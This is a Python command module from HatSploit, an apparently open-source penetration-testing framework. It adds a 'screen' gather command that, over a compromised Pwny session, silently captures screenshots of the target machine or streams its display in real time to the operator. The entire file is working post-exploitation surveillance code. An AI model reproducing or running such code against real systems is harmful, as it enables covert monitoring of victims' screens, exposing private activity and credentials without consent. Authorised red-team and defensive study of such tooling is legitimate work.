"""
This command requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import sys
import threading

from pwny.api import *
from pwny.types import *

from pex.proto.stream import StreamClient

from hatsploit.lib.command import Command

UI_BASE = 5

UI_SCREENSHOT = tlv_custom_tag(API_CALL_STATIC, UI_BASE, API_CALL)


class HatSploitCommand(Command):
    def __init__(self):
        super().__init__()

        self.details = {
            'Category': "gather",
            'Name': "screen",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - command developer'
            ],
            'Description': "Stream screen or take snapshot.",
            'Usage': "screen <option> [arguments]",
            'MinArgs': 1,
            'Options': {
                '-s': ['<path>', 'Take a screenshot.'],
                '-r': ['<viewer> <path>', 'Stream screen in real time.']
            }
        }

        self.stop = False

    def read_thread(self, path: str):
        while True:
            if self.stop:
                break

            result = self.session.send_command(
                tag=UI_SCREENSHOT
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error(f"Failed to take screenshot!")
                break

            frame = result.get_raw(TLV_TYPE_BYTES)

            try:
                with open(path, 'wb') as f:
                    f.write(frame)

            except Exception:
                self.print_error(f"Failed to write image to {path}!")

    def run(self, argc, argv):
        if argv[1] == '-r':
            if argc > 3:
                thread = threading.Thread(target=self.read_thread, args=(argv[3],))
                thread.setDaemon(True)
                thread.start()

                client = StreamClient(path=argv[2], image=argv[3])
                client.create_video()

                self.print_process(f"Streaming screen...")
                self.print_information("Press Ctrl-C to stop.")

                try:
                    client.stream()
                    for _ in sys.stdin:
                        pass

                except KeyboardInterrupt:
                    self.print_process("Stopping...")
                    self.stop = True

                thread.join()

        elif argv[1] == '-s':
            if argc > 2:
                result = self.session.send_command(
                    tag=UI_SCREENSHOT,
                    args={
                        TLV_TYPE_INT: 1,
                    }
                )

                if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                    self.print_error(f"Failed to take screenshot!")
                    return

                frame = result.get_raw(TLV_TYPE_BYTES)

                try:
                    with open(argv[2], 'wb') as f:
                        f.write(frame)
                except Exception:
                    self.print_error(f"Failed to write image to {argv[2]}!")
